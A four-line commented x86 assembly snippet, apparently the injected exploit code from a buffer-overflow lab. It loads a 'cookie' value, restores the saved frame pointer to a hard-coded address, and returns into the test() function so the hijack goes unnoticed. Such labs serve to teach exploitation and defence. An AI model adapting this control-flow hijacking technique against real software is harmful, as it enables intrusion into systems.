mov 0x804d108,%eax       # get the cookie value by address, not the value  
mov $0x55683010,%ebp	# restore the ebp for test()
push $0x08048dbe        # push the corrent return location in test()
ret		       		    # return to the test
